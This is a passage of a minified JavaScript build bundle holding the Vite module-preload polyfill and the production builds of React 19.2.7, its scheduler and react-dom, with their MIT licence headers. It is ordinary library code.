(function(){const F=document.createElement("link").relList;if(F&&F.supports&&F.supports("modulepreload"))return;for(const x of document.querySelectorAll('link[rel="modulepreload"]'))p(x);new MutationObserver(x=>{for(const B of x)if(B.type==="childList")for(const W of B.addedNodes)W.tagName==="LINK"&&W.rel==="modulepreload"&&p(W)}).observe(document,{childList:!0,subtree:!0});function M(x){const B={};return x.integrity&&(B.integrity=x.integrity),x.referrerPolicy&&(B.referrerPolicy=x.referrerPolicy),x.crossOrigin==="use-credentials"?B.credentials="include":x.crossOrigin==="anonymous"?B.credentials="omit":B.credentials="same-origin",B}function p(x){if(x.ep)return;x.ep=!0;const B=M(x);fetch(x.href,B)}})();function oh(T){return T&&T.__esModule&&Object.prototype.hasOwnProperty.call(T,"default")?T.default:T}var gr={exports:{}},Ri={};/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Of;function rh(){if(Of)return Ri;Of=1;var T=Symbol.for("react.transitional.element"),F=Symbol.for("react.fragment");function M(p,x,B){var W=null;if(B!==void 0&&(W=""+B),x.key!==void 0&&(W=""+x.key),"key"in x){B={};for(var de in x)de!=="key"&&(B[de]=x[de])}else B=x;return x=B.ref,{$$typeof:T,type:p,key:W,ref:x!==void 0?x:null,props:B}}return Ri.Fragment=F,Ri.jsx=M,Ri.jsxs=M,Ri}var xf;function ch(){return xf||(xf=1,gr.exports=rh()),gr.exports}var u=ch(),vr={exports:{}},k={};/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Nf;function uh(){if(Nf)return k;Nf=1;var T=Symbol.for("react.transitional.element"),F=Symbol.for("react.portal"),M=Symbol.for("react.fragment"),p=Symbol.for("react.strict_mode"),x=Symbol.for("react.profiler"),B=Symbol.for("react.consumer"),W=Symbol.for("react.context"),de=Symbol.for("react.forward_ref"),D=Symbol.for("react.suspense"),O=Symbol.for("react.memo"),w=Symbol.for("react.lazy"),I=Symbol.for("react.activity"),fe=Symbol.iterator;function Le(d){return d===null||typeof d!="object"?null:(d=fe&&d[fe]||d["@@iterator"],typeof d=="function"?d:null)}var Oe={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},me=Object.assign,Ke={};function Y(d,S,L){this.props=d,this.context=S,this.refs=Ke,this.updater=L||Oe}Y.prototype.isReactComponent={},Y.prototype.setState=function(d,S){if(typeof d!="object"&&typeof d!="function"&&d!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,d,S,"setState")},Y.prototype.forceUpdate=function(d){this.updater.enqueueForceUpdate(this,d,"forceUpdate")};function $e(){}$e.prototype=Y.prototype;function qe(d,S,L){this.props=d,this.context=S,this.refs=Ke,this.updater=L||Oe}var ra=qe.prototype=new $e;ra.constructor=qe,me(ra,Y.prototype),ra.isPureReactComponent=!0;var ya=Array.isArray;function we(){}var K={H:null,A:null,T:null,S:null},He=Object.prototype.hasOwnProperty;function ca(d,S,L){var R=L.ref;return{$$typeof:T,type:d,key:S,ref:R!==void 0?R:null,props:L}}function ct(d,S){return ca(d.type,S,d.props)}function ua(d){return typeof d=="object"&&d!==null&&d.$$typeof===T}function Qe(d){var S={"=":"=0",":":"=2"};return"$"+d.replace(/[=:]/g,function(L){return S[L]})}var Ta=/\/+/g;function Ea(d,S){return typeof d=="object"&&d!==null&&d.key!=null?Qe(""+d.key):S.toString(36)}function ea(d){switch(d.status){case"fulfilled":return d.value;case"rejected":throw d.reason;default:switch(typeof d.status=="string"?d.then(we,we):(d.status="pending",d.then(function(S){d.status==="pending"&&(d.status="fulfilled",d.value=S)},function(S){d.status==="pending"&&(d.status="rejected",d.reason=S)})),d.status){case"fulfilled":return d.value;case"rejected":throw d.reason}}throw d}function y(d,S,L,R,J){var V=typeof d;(V==="undefined"||V==="boolean")&&(d=null);var se=!1;if(d===null)se=!0;else switch(V){case"bigint":case"string":case"number":se=!0;break;case"object":switch(d.$$typeof){case T:case F:se=!0;break;case w:return se=d._init,y(se(d._payload),S,L,R,J)}}if(se)return J=J(d),se=R===""?"."+Ea(d,0):R,ya(J)?(L="",se!=null&&(L=se.replace(Ta,"$&/")+"/"),y(J,S,L,"",function(wt){return wt})):J!=null&&(ua(J)&&(J=ct(J,L+(J.key==null||d&&d.key===J.key?"":(""+J.key).replace(Ta,"$&/")+"/")+se)),S.push(J)),1;se=0;var Xe=R===""?".":R+":";if(ya(d))for(var Ce=0;Ce<d.length;Ce++)R=d[Ce],V=Xe+Ea(R,Ce),se+=y(R,S,L,V,J);else if(Ce=Le(d),typeof Ce=="function")for(d=Ce.call(d),Ce=0;!(R=d.next()).done;)R=R.value,V=Xe+Ea(R,Ce++),se+=y(R,S,L,V,J);else if(V==="object"){if(typeof d.then=="function")return y(ea(d),S,L,R,J);throw S=String(d),Error("Objects are not valid as a React child (found: "+(S==="[object Object]"?"object with keys {"+Object.keys(d).join(", ")+"}":S)+"). If you meant to render a collection of children, use an array instead.")}return se}function N(d,S,L){if(d==null)return d;var R=[],J=0;return y(d,R,"","",function(V){return S.call(L,V,J++)}),R}function q(d){if(d._status===-1){var S=d._result;S=S(),S.then(function(L){(d._status===0||d._status===-1)&&(d._status=1,d._result=L)},function(L){(d._status===0||d._status===-1)&&(d._status=2,d._result=L)}),d._status===-1&&(d._status=0,d._result=S)}if(d._status===1)return d._result.default;throw d._result}var ie=typeof reportError=="function"?reportError:function(d){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var S=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof d=="object"&&d!==null&&typeof d.message=="string"?String(d.message):String(d),error:d});if(!window.dispatchEvent(S))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",d);return}console.error(d)},oe={map:N,forEach:function(d,S,L){N(d,function(){S.apply(this,arguments)},L)},count:function(d){var S=0;return N(d,function(){S++}),S},toArray:function(d){return N(d,function(S){return S})||[]},only:function(d){if(!ua(d))throw Error("React.Children.only expected to receive a single React element child.");return d}};return k.Activity=I,k.Children=oe,k.Component=Y,k.Fragment=M,k.Profiler=x,k.PureComponent=qe,k.StrictMode=p,k.Suspense=D,k.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=K,k.__COMPILER_RUNTIME={__proto__:null,c:function(d){return K.H.useMemoCache(d)}},k.cache=function(d){return function(){return d.apply(null,arguments)}},k.cacheSignal=function(){return null},k.cloneElement=function(d,S,L){if(d==null)throw Error("The argument must be a React element, but you passed "+d+".");var R=me({},d.props),J=d.key;if(S!=null)for(V in S.key!==void 0&&(J=""+S.key),S)!He.call(S,V)||V==="key"||V==="__self"||V==="__source"||V==="ref"&&S.ref===void 0||(R[V]=S[V]);var V=arguments.length-2;if(V===1)R.children=L;else if(1<V){for(var se=Array(V),Xe=0;Xe<V;Xe++)se[Xe]=arguments[Xe+2];R.children=se}return ca(d.type,J,R)},k.createContext=function(d){return d={$$typeof:W,_currentValue:d,_currentValue2:d,_threadCount:0,Provider:null,Consumer:null},d.Provider=d,d.Consumer={$$typeof:B,_context:d},d},k.createElement=function(d,S,L){var R,J={},V=null;if(S!=null)for(R in S.key!==void 0&&(V=""+S.key),S)He.call(S,R)&&R!=="key"&&R!=="__self"&&R!=="__source"&&(J[R]=S[R]);var se=arguments.length-2;if(se===1)J.children=L;else if(1<se){for(var Xe=Array(se),Ce=0;Ce<se;Ce++)Xe[Ce]=arguments[Ce+2];J.children=Xe}if(d&&d.defaultProps)for(R in se=d.defaultProps,se)J[R]===void 0&&(J[R]=se[R]);return ca(d,V,J)},k.createRef=function(){return{current:null}},k.forwardRef=function(d){return{$$typeof:de,render:d}},k.isValidElement=ua,k.lazy=function(d){return{$$typeof:w,_payload:{_status:-1,_result:d},_init:q}},k.memo=function(d,S){return{$$typeof:O,type:d,compare:S===void 0?null:S}},k.startTransition=function(d){var S=K.T,L={};K.T=L;try{var R=d(),J=K.S;J!==null&&J(L,R),typeof R=="object"&&R!==null&&typeof R.then=="function"&&R.then(we,ie)}catch(V){ie(V)}finally{S!==null&&L.types!==null&&(S.types=L.types),K.T=S}},k.unstable_useCacheRefresh=function(){return K.H.useCacheRefresh()},k.use=function(d){return K.H.use(d)},k.useActionState=function(d,S,L){return K.H.useActionState(d,S,L)},k.useCallback=function(d,S){return K.H.useCallback(d,S)},k.useContext=function(d){return K.H.useContext(d)},k.useDebugValue=function(){},k.useDeferredValue=function(d,S){return K.H.useDeferredValue(d,S)},k.useEffect=function(d,S){return K.H.useEffect(d,S)},k.useEffectEvent=function(d){return K.H.useEffectEvent(d)},k.useId=function(){return K.H.useId()},k.useImperativeHandle=function(d,S,L){return K.H.useImperativeHandle(d,S,L)},k.useInsertionEffect=function(d,S){return K.H.useInsertionEffect(d,S)},k.useLayoutEffect=function(d,S){return K.H.useLayoutEffect(d,S)},k.useMemo=function(d,S){return K.H.useMemo(d,S)},k.useOptimistic=function(d,S){return K.H.useOptimistic(d,S)},k.useReducer=function(d,S,L){return K.H.useReducer(d,S,L)},k.useRef=function(d){return K.H.useRef(d)},k.useState=function(d){return K.H.useState(d)},k.useSyncExternalStore=function(d,S,L){return K.H.useSyncExternalStore(d,S,L)},k.useTransition=function(){return K.H.useTransition()},k.version="19.2.7",k}var Lf;function xr(){return Lf||(Lf=1,vr.exports=uh()),vr.exports}var ye=xr();const dh=oh(ye);var br={exports:{}},wi={},Ar={exports:{}},yr={};/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Df;function fh(){return Df||(Df=1,(function(T){function F(y,N){var q=y.length;y.push(N);e:for(;0<q;){var ie=q-1>>>1,oe=y[ie];if(0<x(oe,N))y[ie]=N,y[q]=oe,q=ie;else break e}}function M(y){return y.length===0?null:y[0]}function p(y){if(y.length===0)return null;var N=y[0],q=y.pop();if(q!==N){y[0]=q;e:for(var ie=0,oe=y.length,d=oe>>>1;ie<d;){var S=2*(ie+1)-1,L=y[S],R=S+1,J=y[R];if(0>x(L,q))R<oe&&0>x(J,L)?(y[ie]=J,y[R]=q,ie=R):(y[ie]=L,y[S]=q,ie=S);else if(R<oe&&0>x(J,q))y[ie]=J,y[R]=q,ie=R;else break e}}return N}function x(y,N){var q=y.sortIndex-N.sortIndex;return q!==0?q:y.id-N.id}if(T.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var B=performance;T.unstable_now=function(){return B.now()}}else{var W=Date,de=W.now();T.unstable_now=function(){return W.now()-de}}var D=[],O=[],w=1,I=null,fe=3,Le=!1,Oe=!1,me=!1,Ke=!1,Y=typeof setTimeout=="function"?setTimeout:null,$e=typeof clearTimeout=="function"?clearTimeout:null,qe=typeof setImmediate<"u"?setImmediate:null;function ra(y){for(var N=M(O);N!==null;){if(N.callback===null)p(O);else if(N.startTime<=y)p(O),N.sortIndex=N.expirationTime,F(D,N);else break;N=M(O)}}function ya(y){if(me=!1,ra(y),!Oe)if(M(D)!==null)Oe=!0,we||(we=!0,Qe());else{var N=M(O);N!==null&&ea(ya,N.startTime-y)}}var we=!1,K=-1,He=5,ca=-1;function ct(){return Ke?!0:!(T.unstable_now()-ca<He)}function ua(){if(Ke=!1,we){var y=T.unstable_now();ca=y;var N=!0;try{e:{Oe=!1,me&&(me=!1,$e(K),K=-1),Le=!0;var q=fe;try{a:{for(ra(y),I=M(D);I!==null&&!(I.expirationTime>y&&ct());){var ie=I.callback;if(typeof ie=="function"){I.callback=null,fe=I.priorityLevel;var oe=ie(I.expirationTime<=y);if(y=T.unstable_now(),typeof oe=="function"){I.callback=oe,ra(y),N=!0;break a}I===M(D)&&p(D),ra(y)}else p(D);I=M(D)}if(I!==null)N=!0;else{var d=M(O);d!==null&&ea(ya,d.startTime-y),N=!1}}break e}finally{I=null,fe=q,Le=!1}N=void 0}}finally{N?Qe():we=!1}}}var Qe;if(typeof qe=="function")Qe=function(){qe(ua)};else if(typeof MessageChannel<"u"){var Ta=new MessageChannel,Ea=Ta.port2;Ta.port1.onmessage=ua,Qe=function(){Ea.postMessage(null)}}else Qe=function(){Y(ua,0)};function ea(y,N){K=Y(function(){y(T.unstable_now())},N)}T.unstable_IdlePriority=5,T.unstable_ImmediatePriority=1,T.unstable_LowPriority=4,T.unstable_NormalPriority=3,T.unstable_Profiling=null,T.unstable_UserBlockingPriority=2,T.unstable_cancelCallback=function(y){y.callback=null},T.unstable_forceFrameRate=function(y){0>y||125<y?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):He=0<y?Math.floor(1e3/y):5},T.unstable_getCurrentPriorityLevel=function(){return fe},T.unstable_next=function(y){switch(fe){case 1:case 2:case 3:var N=3;break;default:N=fe}var q=fe;fe=N;try{return y()}finally{fe=q}},T.unstable_requestPaint=function(){Ke=!0},T.unstable_runWithPriority=function(y,N){switch(y){case 1:case 2:case 3:case 4:case 5:break;default:y=3}var q=fe;fe=y;try{return N()}finally{fe=q}},T.unstable_scheduleCallback=function(y,N,q){var ie=T.unstable_now();switch(typeof q=="object"&&q!==null?(q=q.delay,q=typeof q=="number"&&0<q?ie+q:ie):q=ie,y){case 1:var oe=-1;break;case 2:oe=250;break;case 5:oe=1073741823;break;case 4:oe=1e4;break;default:oe=5e3}return oe=q+oe,y={id:w++,callback:N,priorityLevel:y,startTime:q,expirationTime:oe,sortIndex:-1},q>ie?(y.sortIndex=q,F(O,y),M(D)===null&&y===M(O)&&(me?($e(K),K=-1):me=!0,ea(ya,q-ie))):(y.sortIndex=oe,F(D,y),Oe||Le||(Oe=!0,we||(we=!0,Qe()))),y},T.unstable_shouldYield=ct,T.unstable_wrapCallback=function(y){var N=fe;return function(){var q=fe;fe=N;try{return y.apply(this,arguments)}finally{fe=q}}}})(yr)),yr}var If;function mh(){return If||(If=1,Ar.exports=fh()),Ar.exports}var Tr={exports:{}},Ze={};/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var _f;function ph(){if(_f)return Ze;_f=1;var T=xr();function F(D){var O="https://react.dev/errors/"+D;if(1<arguments.length){O+="?args[]="+encodeURIComponent(arguments[1]);for(var w=2;w<arguments.length;w++)O+="&args[]="+encodeURIComponent(arguments[w])}return"Minified React error #"+D+"; visit "+O+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function M(){}var p={d:{f:M,r:function(){throw Error(F(522))},D:M,C:M,L:M,m:M,X:M,S:M,M},p:0,findDOMNode:null},x=Symbol.for("react.portal");function B(D,O,w){var I=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:x,key:I==null?null:""+I,children:D,containerInfo:O,implementation:w}}var W=T.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function de(D,O){if(D==="font")return"";if(typeof O=="string")return O==="use-credentials"?O:""}return Ze.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=p,Ze.createPortal=function(D,O){var w=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!O||O.nodeType!==1&&O.nodeType!==9&&O.nodeType!==11)throw Error(F(299));return B(D,O,null,w)},Ze.flushSync=function(D){var O=W.T,w=p.p;try{if(W.T=null,p.p=2,D)return D()}finally{W.T=O,p.p=w,p.d.f()}},Ze.preconnect=function(D,O){typeof D=="string"&&(O?(O=O.crossOrigin,O=typeof O=="string"?O==="use-credentials"?O:"":void 0):O=null,p.d.C(D,O))},Ze.prefetchDNS=function(D){typeof D=="string"&&p.d.D(D)},Ze.preinit=function(D,O){if(typeof D=="string"&&O&&typeof O.as=="string"){var w=O.as,I=de(w,O.crossOrigin),fe=typeof O.integrity=="string"?O.integrity:void 0,Le=typeof O.fetchPriority=="string"?O.fetchPriority:void 0;w==="style"?p.d.S(D,typeof O.precedence=="string"?O.precedence:void 0,{crossOrigin:I,integrity:fe,fetchPriority:Le}):w==="script"&&p.d.X(D,{crossOrigin:I,integrity:fe,fetchPriority:Le,nonce:typeof O.nonce=="string"?O.nonce:void 0})}},Ze.preinitModule=function(D,O){if(typeof D=="string")if(typeof O=="object"&&O!==null){if(O.as==null||O.as==="script"){var w=de(O.as,O.crossOrigin);p.d.M(D,{crossOrigin:w,integrity:typeof O.integrity=="string"?O.integrity:void 0,nonce:typeof O.nonce=="string"?O.nonce:void 0})}}else O==null&&p.d.M(D)},Ze.preload=function(D,O){if(typeof D=="string"&&typeof O=="object"&&O!==null&&typeof O.as=="string"){var w=O.as,I=de(w,O.crossOrigin);p.d.L(D,w,{crossOrigin:I,integrity:typeof O.integrity=="string"?O.integrity:void 0,nonce:typeof O.nonce=="string"?O.nonce:void 0,type:typeof O.type=="string"?O.type:void 0,fetchPriority:typeof O.fetchPriority=="string"?O.fetchPriority:void 0,referrerPolicy:typeof O.referrerPolicy=="string"?O.referrerPolicy:void 0,imageSrcSet:typeof O.imageSrcSet=="string"?O.imageSrcSet:void 0,imageSizes:typeof O.imageSizes=="string"?O.imageSizes:void 0,media:typeof O.media=="string"?O.media:void 0})}},Ze.preloadModule=function(D,O){if(typeof D=="string")if(O){var w=de(O.as,O.crossOrigin);p.d.m(D,{as:typeof O.as=="string"&&O.as!=="script"?O.as:void 0,crossOrigin:w,integrity:typeof O.integrity=="string"?O.integrity:void 0})}else p.d.m(D)},Ze.requestFormReset=function(D){p.d.r(D)},Ze.unstable_batchedUpdates=function(D,O){return D(O)},Ze.useFormState=function(D,O,w){return W.H.useFormState(D,O,w)},Ze.useFormStatus=function(){return W.H.useHostTransitionStatus()},Ze.version="19.2.7",Ze}var Uf;function hh(){if(Uf)return Tr.exports;Uf=1;function T(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(T)}catch(F){console.error(F)}}return T(),Tr.exports=ph(),Tr.exports}/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Mf;function gh(){if(Mf)return wi;Mf=1;var T=mh(),F=xr(),M=hh();function p(e){var a="https://react.dev/errors/"+e;if(1<arguments.length){a+="?args[]="+encodeURIComponent(arguments[1]);for(var t=2;t<arguments.length;t++)a+="&args[]="+encodeURIComponent(arguments[t])}return"Minified React error #"+e+"; visit "+a+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function x(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function B(e){var a=e,t=e;if(e.alternate)for(;a.return;)a=a.return;else{e=a;do a=e,(a.flags&4098)!==0&&(t=a.return),e=a.return;while(e)}return a.tag===3?t:null}function W(e){if(e.tag===13){var a=e.memoizedState;if(a===null&&(e=e.alternate,e!==null&&(a=e.memoizedState)),a!==null)return a.dehydrated}return null}function de(e){if(e.tag===31){var a=e.memoizedState;if(a===null&&(e=e.alternate,e!==null&&(a=e.memoizedState)),a!==null)return a.dehydrated}return null}function D(e){if(B(e)!==e)throw Error(p(188))}function O(e){var a=e.alternate;if(!a){if(a=B(e),a===null)throw Error(p(188));return a!==e?null:e}for(var t=e,l=a;;){var i=t.return;if(i===null)break;var n=i.alternate;if(n===null){if(l=i.return,l!==null){t=l;continue}break}if(i.child===n.child){for(n=i.child;n;){if(n===t)return D(i),e;if(n===l)return D(i),a;n=n.sibling}throw Error(p(188))}if(t.return!==l.return)t=i,l=n;else{for(var s=!1,o=i.child;o;){if(o===t){s=!0,t=i,l=n;break}if(o===l){s=!0,l=i,t=n;break}o=o.sibling}if(!s){for(o=n.child;o;){if(o===t){s=!0,t=n,l=i;break}if(o===l){s=!0,l=n,t=i;break}o=o.sibling}if(!s)throw Error(p(189))}}if(t.alternate!==l)throw Error(p(190))}if(t.tag!==3)throw Error(p(188));return t.stateNode.current===t?e:a}function w(e){var a=e.tag;if(a===5||a===26||a===27||a===6)return e;for(e=e.child;e!==null;){if(a=w(e),a!==null)return a;e=e.sibling}return null}var I=Object.assign,fe=Symbol.for("react.element"),Le=Symbol.for("react.transitional.element"),Oe=Symbol.for("react.portal"),me=Symbol.for("react.fragment"),Ke=Symbol.for("react.strict_mode"),Y=Symbol.for("react.profiler"),$e=Symbol.for("react.consumer"),qe=Symbol.for("react.context"),ra=Symbol.for("react.forward_ref"),ya=Symbol.for("react.suspense"),we=Symbol.for("react.suspense_list"),K=Symbol.for("react.memo"),He=Symbol.for("react.lazy"),ca=Symbol.for("react.activity"),ct=Symbol.for("react.memo_cache_sentinel"),ua=Symbol.iterator;function Qe(e){return e===null||typeof e!="object"?null:(e=ua&&e[ua]||e["@@iterator"],typeof e=="function"?e:null)}var Ta=Symbol.for("react.client.reference");function Ea(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===Ta?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case me:return"Fragment";case Y:return"Profiler";case Ke:return"StrictMode";case ya:return"Suspense";case we:return"SuspenseList";case ca:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case Oe:return"Portal";case qe:return e.displayName||"Context";case $e:return(e._context.displayName||"Context")+".Consumer";case ra:var a=e.render;return e=e.displayName,e||(e=a.displayName||a.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case K:return a=e.displayName||null,a!==null?a:Ea(e.type)||"Memo";case He:a=e._payload,e=e._init;try{return Ea(e(a))}catch{}}return null}var ea=Array.isArray,y=F.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,N=M.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,q={pending:!1,data:null,method:null,action:null},ie=[],oe=-1;function d(e){return{current:e}}function S(e){0>oe||(e.current=ie[oe],ie[oe]=null,oe--)}function L(e,a){oe++,ie[oe]=e.current,e.current=a}var R=d(null),J=d(null),V=d(null),se=d(null);function Xe(e,a){switch(L(V,a),L(J,e),L(R,null),a.nodeType){case 9:case 11:e=(e=a.documentElement)&&(e=e.namespaceURI)?Qd(e):0;break;default:if(e=a.tagName,a=a.namespaceURI)a=Qd(a),e=Xd(a,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}S(R),L(R,e)}function Ce(){S(R),S(J),S(V)}function wt(e){e.memoizedState!==null&&L(se,e);var a=R.current,t=Xd(a,e.type);a!==t&&(L(J,e),L(R,t))}function el(e){J.current===e&&(S(R),S(J)),se.current===e&&(S(se),Ii._currentValue=q)}var jl,zi;function Pa(e){if(jl===void 0)try{throw Error()}catch(t){var a=t.stack.trim().match(/\n( *(at )?)/);jl=a&&a[1]||"",zi=-1<t.stack.indexOf(`
    at`)?" (<anonymous>)":-1<t.stack.indexOf("@")?"@unknown:0:0":""}return`
`+jl+e+zi}var ql=!1;function Hl(e,a){if(!e||ql)return"";ql=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var l={DetermineComponentFrameRoot:function(){try{if(a){var C=function(){throw Error()};if(Object.defineProperty(C.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(C,[])}catch(b){var v=b}Reflect.construct(e,[],C)}else{try{C.call()}catch(b){v=b}e.call(C.prototype)}}else{try{throw Error()}catch(b){v=b}(C=e())&&typeof C.catch=="function"&&C.catch(function(){})}}catch(b){if(b&&v&&typeof b.stack=="string")return[b.stack,v.stack]}return[null,null]}};l.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var i=Object.getOwnPropertyDescriptor(l.DetermineComponentFrameRoot,"name");i&&i.configurable&&Object.defineProperty(l.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var n=l.DetermineComponentFrameRoot(),s=n[0],o=n[1];if(s&&o){var r=s.split(`
`),g=o.split(`
`);for(i=l=0;l<r.length&&!r[l].includes("DetermineComponentFrameRoot");)l++;for(;i<g.length&&!g[i].includes("DetermineComponentFrameRoot");)i++;if(l===r.length||i===g.length)for(l=r.length-1,i=g.length-1;1<=l&&0<=i&&r[l]!==g[i];)i--;for(;1<=l&&0<=i;l--,i--)if(r[l]!==g[i]){if(l!==1||i!==1)do if(l--,i--,0>i||r[l]!==g[i]){var A=`
`+r[l].replace(" at new "," at ");return e.displayName&&A.includes("<anonymous>")&&(A=A.replace("<anonymous>",e.displayName)),A}while(1<=l&&0<=i);break}}}finally{ql=!1,Error.prepareStackTrace=t}return(t=e?e.displayName||e.name:"")?Pa(t):""}function Fi(e,a){switch(e.tag){case 26:case 27:case 5:return Pa(e.type);case 16:return Pa("Lazy");case 13:return e.child!==a&&a!==null?Pa("Suspense Fallback"):Pa("Suspense");case 19:return Pa("SuspenseList");case 0:case 15:return Hl(e.type,!1);case 11:return Hl(e.type.render,!1);case 1:return Hl(e.type,!0);case 31:return Pa("Activity");default:return""}}function Gi(e){try{var a="",t=null;do a+=Fi(e,t),t=e,e=e.return;while(e);return a}catch(l){return`
Error generating stack: `+l.message+`
`+l.stack}}var m=Object.prototype.hasOwnProperty,G=T.unstable_scheduleCallback,_=T.unstable_cancelCallback,X=T.unstable_shouldYield,ne=T.unstable_requestPaint,H=T.unstable_now,ze=T.unstable_getCurrentPriorityLevel,Ba=T.unstable_ImmediatePriority,ka=T.unstable_UserBlockingPriority,Ma=T.unstable_NormalPriority,Pf=T.unstable_LowPriority,Nr=T.unstable_IdlePriority,Bf=T.log,kf=T.unstable_setDisableYieldValue,Pl=null,da=null;function ut(e){if(typeof Bf=="function"&&kf(e),da&&typeof da.setStrictMode=="function")try{da.setStrictMode(Pl,e)}catch{}}var fa=Math.clz32?Math.clz32:Qf,Jf=Math.log,Yf=Math.LN2;function Qf(e){return e>>>=0,e===0?32:31-(Jf(e)/Yf|0)|0}var ji=256,qi=262144,Hi=4194304;function zt(e){var a=e&42;if(a!==0)return a;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Pi(e,a,t){var l=e.pendingLanes;if(l===0)return 0;var i=0,n=e.suspendedLanes,s=e.pingedLanes;e=e.warmLanes;var o=l&134217727;return o!==0?(l=o&~n,l!==0?i=zt(l):(s&=o,s!==0?i=zt(s):t||(t=o&~e,t!==0&&(i=zt(t))))):(o=l&~n,o!==0?i=zt(o):s!==0?i=zt(s):t||(t=l&~e,t!==0&&(i=zt(t)))),i===0?0:a!==0&&a!==i&&(a&n)===0&&(n=i&-i,t=a&-a,n>=t||n===32&&(t&4194048)!==0)?a:i}function Bl(e,a){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&a)===0}function Xf(e,a){switch(e){case 1:case 2:case 4:case 8:case 64:return a+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return a+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Lr(){var e=Hi;return Hi<<=1,(Hi&62914560)===0&&(Hi=4194304),e}function ls(e){for(var a=[],t=0;31>t;t++)a.push(e);return a}function kl(e,a){e.pendingLanes|=a,a!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function Zf(e,a,t,l,i,n){var s=e.pendingLanes;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=t,e.entangledLanes&=t,e.errorRecoveryDisabledLanes&=t,e.shellSuspendCounter=0;var o=e.entanglements,r=e.expirationTimes,g=e.hiddenUpdates;for(t=s&~t;0<t;){var A=31-fa(t),C=1<<A;o[A]=0,r[A]=-1;var v=g[A];if(v!==null)for(g[A]=null,A=0;A<v.length;A++){var b=v[A];b!==null&&(b.lane&=-536870913)}t&=~C}l!==0&&Dr(e,l,0),n!==0&&i===0&&e.tag!==0&&(e.suspendedLanes|=n&~(s&~a))}function Dr(e,a,t){e.pendingLanes|=a,e.suspendedLanes&=~a;var l=31-fa(a);e.entangledLanes|=a,e.entanglements[l]=e.entanglements[l]|1073741824|t&261930}function Ir(e,a){var t=e.entangledLanes|=a;for(e=e.entanglements;t;){var l=31-fa(t),i=1<<l;i&a|e[l]&a&&(e[l]|=a),t&=~i}}function _r(e,a){var t=a&-a;return t=(t&42)!==0?1:is(t),(t&(e.suspendedLanes|a))!==0?0:t}function is(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function ns(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function Ur(){var e=N.p;return 